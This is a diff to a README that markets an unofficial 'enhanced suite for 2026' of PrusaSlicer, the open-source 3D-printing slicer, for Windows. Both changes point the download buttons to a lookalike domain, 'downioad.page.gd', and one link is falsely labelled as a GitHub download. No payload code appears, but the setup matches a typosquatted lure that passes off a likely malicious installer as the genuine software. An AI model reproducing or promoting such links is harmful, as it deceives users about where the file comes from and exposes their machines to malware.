@@ -2,7 +2,7 @@
 
 PrusaSlicer is a powerful open-source slicing software for 3D printing, and this enhanced suite for 2026 brings additional features and portability to Windows users. It includes custom material profiles, advanced preview tools, and optimized settings to elevate your 3D printing experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -90,7 +90,7 @@ This package includes the core PrusaSlicer application along with resource files
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Disclaimer
 
